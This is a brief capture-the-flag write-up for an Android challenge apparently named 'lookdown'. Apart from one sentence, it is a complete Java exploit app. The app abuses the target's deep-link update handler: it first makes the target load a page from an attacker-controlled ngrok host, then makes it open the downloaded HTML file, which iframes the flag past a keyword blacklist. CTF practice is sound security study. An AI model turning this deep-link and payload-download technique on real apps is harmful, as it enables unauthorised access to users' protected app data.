The idea for this challenge is to bypass the 'flag' blacklist by iframing the flag in a file that will be downloaded and stored in the Downloads folder.

```java
package com.dimas.lookdownexploit;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Base64;

import androidx.appcompat.app.AppCompatActivity;

import java.io.File;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        sendUrl("https://c573-182-1-116-255.ngrok-free.app");
        sleep(5000);
        finish();
        sendUrl("file:///sdcard/Download/download.html");
    }

    public void sendUrl(String url){
        String encodedUrlParam = Uri.encode(url);
        url = "lookdown://lookdown/update?url=" + encodedUrlParam;
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        startActivity(intent);
    }

    public static void sleep(final long durationMillis) {
            try {
                Thread.sleep(durationMillis);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
    }
}
```
